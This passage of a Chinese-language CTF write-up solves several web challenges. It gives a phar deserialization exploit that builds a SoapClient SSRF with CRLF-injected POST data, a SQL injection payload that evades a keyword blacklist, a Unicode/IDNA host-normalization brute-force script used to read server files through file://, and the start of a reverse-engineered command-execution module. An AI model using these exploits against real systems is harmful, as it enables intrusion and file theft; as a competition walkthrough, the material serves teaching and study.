        <span class="nv">$class</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func</span><span class="p">);</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$class</span><span class="o">-&gt;</span><span class="na">newInstanceArgs</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span><span class="p">);</span>
        <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">getMIME</span><span class="p">(){</span>
        <span class="nv">$finfo</span> <span class="o">=</span> <span class="nb">finfo_open</span><span class="p">(</span><span class="nx">FILEINFO_MIME_TYPE</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">=</span> <span class="nb">finfo_file</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span><span class="p">);</span>
        <span class="nb">finfo_close</span><span class="p">(</span><span class="nv">$finfo</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="k">class</span> <span class="nc">Check</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$file_name</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span> <span class="o">=</span> <span class="nv">$file_name</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">check</span><span class="p">(){</span>
        <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">mb_strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s2">"&lt;?"</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"&amp;lt;? in contents!"</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>接下来这个admin.php，需要一个ssrf然后，之后会触发getflag函数把flag发到你服务器上</p>
<div class="highlight"><pre><span></span><span class="x">#admin.php</span>
<span class="cp">&lt;?php</span>
<span class="k">include</span> <span class="s1">'config.php'</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">Ad</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$ip</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$port</span><span class="p">;</span>

    <span class="k">public</span> <span class="nv">$clazz</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$func1</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$func2</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$func3</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$instance</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$arg1</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$arg2</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$arg3</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$clazz</span><span class="p">,</span> <span class="nv">$func1</span><span class="p">,</span> <span class="nv">$func2</span><span class="p">,</span> <span class="nv">$func3</span><span class="p">,</span> <span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">,</span> <span class="nv">$arg3</span><span class="p">){</span>

        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span> <span class="o">=</span> <span class="nv">$ip</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">port</span> <span class="o">=</span> <span class="nv">$port</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clazz</span> <span class="o">=</span> <span class="nv">$clazz</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func1</span> <span class="o">=</span> <span class="nv">$func1</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func2</span> <span class="o">=</span> <span class="nv">$func2</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func3</span> <span class="o">=</span> <span class="nv">$func3</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arg1</span> <span class="o">=</span> <span class="nv">$arg1</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arg2</span> <span class="o">=</span> <span class="nv">$arg2</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arg3</span> <span class="o">=</span> <span class="nv">$arg3</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">check</span><span class="p">(){</span>

        <span class="nv">$reflect</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clazz</span><span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instance</span> <span class="o">=</span> <span class="nv">$reflect</span><span class="o">-&gt;</span><span class="na">newInstanceArgs</span><span class="p">();</span>

        <span class="nv">$reflectionMethod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionMethod</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clazz</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func1</span><span class="p">);</span>
        <span class="nv">$reflectionMethod</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instance</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arg1</span><span class="p">);</span>

        <span class="nv">$reflectionMethod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionMethod</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clazz</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func2</span><span class="p">);</span>
        <span class="nv">$reflectionMethod</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instance</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arg2</span><span class="p">);</span>

        <span class="nv">$reflectionMethod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionMethod</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">clazz</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">func3</span><span class="p">);</span>
        <span class="nv">$reflectionMethod</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instance</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">arg3</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="nx">getFlag</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ip</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">port</span><span class="p">);</span>
        <span class="c1">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'127.0.0.1'</span><span class="p">){</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">])){</span>

        <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ip'</span><span class="p">];</span>     <span class="c1">//你用来获取flag的服务器ip</span>
        <span class="nv">$port</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'port'</span><span class="p">];</span> <span class="c1">//你用来获取flag的服务器端口</span>
        <span class="nv">$clazz</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'clazz'</span><span class="p">];</span>
        <span class="nv">$func1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'func1'</span><span class="p">];</span>
        <span class="nv">$func2</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'func2'</span><span class="p">];</span>
        <span class="nv">$func3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'func3'</span><span class="p">];</span>
        <span class="nv">$arg1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'arg1'</span><span class="p">];</span>
        <span class="nv">$arg2</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'arg2'</span><span class="p">];</span>
        <span class="nv">$arg2</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'arg3'</span><span class="p">];</span>
        <span class="nv">$admin</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Ad</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$clazz</span><span class="p">,</span> <span class="nv">$func1</span><span class="p">,</span> <span class="nv">$func2</span><span class="p">,</span> <span class="nv">$func3</span><span class="p">,</span> <span class="nv">$arg1</span><span class="p">,</span> <span class="nv">$arg2</span><span class="p">,</span> <span class="nv">$arg3</span><span class="p">);</span>
        <span class="nv">$admin</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="s2">"You r not admin!"</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>经过大致分析，需要点： ssrf、触发反序列化、上传内容不能有&lt;?、不能直接用phar等已见的协议触发。</p>
<p>这里正则绕过：<code>php://filter/resource=phar://phar.phar</code></p>
<p>ssrf: 因为可以实例化任何类，然而题目并没有给什么有用的，自然想到SoapClient</p>
<p>上传内容不能有&lt;?绕过： 结合前面两题的trick<code>&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;</code></p>
<p>触发反序列化：<code>$this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</code></p>
<p>那么这些点全部都有了，直接贴exp吧。</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s1">'test.phar'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s1">'test.txt'</span><span class="p">,</span><span class="s1">'text'</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s1">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span><span class="p">);</span>

<span class="k">class</span> <span class="nc">File</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file_name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">"SoapClient"</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$target</span> <span class="o">=</span> <span class="s2">"http://127.0.0.1/admin.php"</span><span class="p">;</span>
        <span class="nv">$post_string</span> <span class="o">=</span> <span class="s1">'admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span><span class="o">.</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
        <span class="nv">$headers</span> <span class="o">=</span> <span class="p">[];</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span>  <span class="o">=</span> <span class="p">[</span>
            <span class="k">null</span><span class="p">,</span>
            <span class="k">array</span><span class="p">(</span><span class="s1">'location'</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span>
                  <span class="s1">'user_agent'</span><span class="o">=&gt;</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'^^'</span><span class="p">,</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="s1">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s1">'^^'</span><span class="p">,</span><span class="nv">$headers</span><span class="p">)</span><span class="o">.</span><span class="s1">'Content-Length: '</span><span class="o">.</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post_string</span><span class="p">)</span><span class="o">.</span><span class="s1">'^^^^'</span><span class="o">.</span><span class="nv">$post_string</span><span class="p">),</span>
                  <span class="s1">'uri'</span><span class="o">=&gt;</span><span class="s1">'hello'</span><span class="p">)</span>
        <span class="p">];</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">;</span>
<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$object</span><span class="p">));</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$object</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</pre></div>
<p>把生成的test.phar改成test.jpg上传，然后访问<code>php://filter/resource=phar://upload/2bc454e1fc8129de63d3c034e5c0c24f/0412c29576c708cf0155e8de242169b1.jpg</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819102450-85b206be-c228-1.png"/></p>
<h2 data-content="1" id="e70e4caa0b740914157a16cf34d804cd">easy_sql</h2>
<p>这道题下午队里师傅突然说扫到源码（传说中的运维事故，运维vim异常退出导致源码泄露，运维背锅，出题人已哭晕在厕所。），源码如下</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="nb">session_start</span><span class="p">();</span>

    <span class="k">include_once</span> <span class="s2">"config.php"</span><span class="p">;</span>

    <span class="nv">$post</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$get</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">global</span> <span class="nv">$MysqlLink</span><span class="p">;</span>

    <span class="c1">//GetPara();</span>
    <span class="nv">$MysqlLink</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="nv">$datauser</span><span class="p">,</span><span class="nv">$datapass</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$MysqlLink</span><span class="p">){</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"Mysql Connect Error!"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$selectDB</span> <span class="o">=</span> <span class="nx">mysqli_select_db</span><span class="p">(</span><span class="nv">$MysqlLink</span><span class="p">,</span><span class="nv">$dataName</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$selectDB</span><span class="p">){</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">"Choose Database Error!"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$v</span><span class="p">)){</span>
            <span class="nv">$post</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">){</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">//die();</span>
    <span class="cp">?&gt;</span><span class="x"></span>

<span class="x">&lt;html&gt;</span>
<span class="x">&lt;head&gt;</span>
<span class="x">&lt;/head&gt;</span>

<span class="x">&lt;body&gt;</span>

<span class="x">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;</span>
<span class="x">&lt;form action="" method="post"&gt;</span>
<span class="x">&lt;input type="text" name="query"&gt;</span>
<span class="x">&lt;input type="submit"&gt;</span>
<span class="x">&lt;/form&gt;</span>
<span class="x">&lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span>

<span class="cp">&lt;?php</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])){</span>
        <span class="nv">$BlackList</span> <span class="o">=</span> <span class="s2">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|</span><span class="se">\"</span><span class="s2">"</span><span class="p">;</span>
        <span class="c1">//var_dump(preg_match("/{$BlackList}/is",$post['query']));</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/</span><span class="si">{</span><span class="nv">$BlackList</span><span class="si">}</span><span class="s2">/is"</span><span class="p">,</span><span class="nv">$post</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])){</span>
            <span class="c1">//echo $post['query'];</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"Nonono."</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post</span><span class="p">[</span><span class="s1">'query'</span><span class="p">])</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">){</span>
            <span class="k">die</span><span class="p">(</span><span class="s2">"Too long."</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"select "</span><span class="o">.</span><span class="nv">$post</span><span class="p">[</span><span class="s1">'query'</span><span class="p">]</span><span class="o">.</span><span class="s2">"||flag from Flag"</span><span class="p">;</span>
        <span class="nx">mysqli_multi_query</span><span class="p">(</span><span class="nv">$MysqlLink</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span>
        <span class="k">do</span><span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysqli_store_result</span><span class="p">(</span><span class="nv">$MysqlLink</span><span class="p">)){</span>
                <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">)){</span>
                    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="o">@</span><span class="nx">mysqli_next_result</span><span class="p">(</span><span class="nv">$MysqlLink</span><span class="p">));</span>

    <span class="p">}</span>

    <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>这一看，感觉跟之前自己fuzz的没啥区别，唯一可喜的就是看到了执行的语句，直接上payload吧，拼接后为：<code>select *,2||flag from Flag</code>即可查出flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145357-1da6a8a6-c24e-1.png"/></p>
<h2 data-content="1" id="b5c4684b6f487ce14b39e532432173e1">pythonnginx</h2>
<p>这题简单明了，直接是用<code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code>，其中关于python的如下图，具体PPT链接如下：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" title="PPT链接">PPT链接</a>，我就不细说了<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094905-86e3f344-c223-1.png"/></p>
<p>我们可以简单的写一个脚本来爆破一下最后一个字符串<code>c</code>，脚本如下</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span><span class="n">urlunsplit</span><span class="p">,</span><span class="n">urlsplit</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
<span class="k">def</span> <span class="nf">get_unicode</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">65536</span><span class="p">):</span>
        <span class="n">uni</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">url</span><span class="o">=</span><span class="s2">"http://suctf.c{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">uni</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">getUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
                <span class="k">print</span><span class="p">(</span><span class="s2">"str: "</span><span class="o">+</span><span class="n">uni</span><span class="o">+</span><span class="s1">' unicode: </span><span class="se">\\</span><span class="s1">u'</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">))[</span><span class="mi">2</span><span class="p">:])</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="k">pass</span>


<span class="k">def</span> <span class="nf">getUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">'suctf.cc'</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">urlsplit</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">'suctf.cc'</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="n">newhost</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">for</span> <span class="n">h</span> <span class="ow">in</span> <span class="n">host</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">'.'</span><span class="p">):</span>
        <span class="n">newhost</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'idna'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">))</span>
    <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'.'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">newhost</span><span class="p">)</span>
    <span class="n">finalUrl</span> <span class="o">=</span> <span class="n">urlunsplit</span><span class="p">(</span><span class="n">parts</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">' '</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">finalUrl</span><span class="p">)</span><span class="o">.</span><span class="n">hostname</span>
    <span class="k">if</span> <span class="n">host</span> <span class="o">==</span> <span class="s1">'suctf.cc'</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">True</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">False</span>

<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">get_unicode</span><span class="p">()</span>
</pre></div>
<p>结果如下，随便拿一个字符就行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094341-c5f6b31a-c222-1.png"/></p>
<p>根据题目提示<code>Dont worry about the suctf.cc. Go on!</code>猜测应该是hosts文件<code>suctf.cc</code>绑定了<code>127.0.0.1</code>，既然是<code>127.0.0.1</code>我们可以尝试用file协议读一下文件</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819095833-d9815172-c224-1.png"/></p>
<p>成功读取，那么现在就是找flag了，根据提示猜测flag位置可能和nginx有关，尝试读一下nginx的配置文件</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100036-22a88f0a-c225-1.png"/><br/>
得到flag<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100100-31587ea2-c225-1.png"/></p>
<h2 data-content="1" id="7fdd41db29b3d63a6e8e19a278bedfb2">Cocktail's Remix</h2>
<p>这题是结合逆向的一道题，扫描一下发现有一个下载功能，可以读文件，但是试了一个常规的flag文件路径都读不到flag，猜测flag应该不在目录里面。还有一个<code>info.php</code>也没有发现什么信息，猜测与题目名字有关，info.php里面搜索一下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161703-b96e3776-c259-1.png"/></p>
<p>果真有点东西，把<code>mod_cocktail.so</code>文件下载下来，丢<code>IDA</code>看一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161939-16c6acdc-c25a-1.png"/></p>
<p>大概意思是获取<code>Reffer</code>头的内容然后传入<code>j_remix</code>后的字符串拿去<code>popen</code>，跟进<code>j_remix</code>看一下，代码如下</p>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp"></span>
<span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">remixedchar</span> <span class="o">=</span> <span class="s">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">num_strchr</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">,</span> <span class="kt">char</span> <span class="n">c</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">str</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="p">)</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">v2</span> <span class="o">-</span> <span class="n">str</span><span class="p">;</span>
  <span class="k">else</span>
    <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">remix</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">remixed</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dedata</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// r13</span>
  <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// si</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// rbp</span>
  <span class="kt">int</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// er14</span>
  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// ST0C_4</span>
  <span class="kt">int</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// er14</span>
  <span class="kt">int</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// er15</span>

  <span class="n">v2</span> <span class="o">=</span> <span class="n">dedata</span><span class="p">;</span>
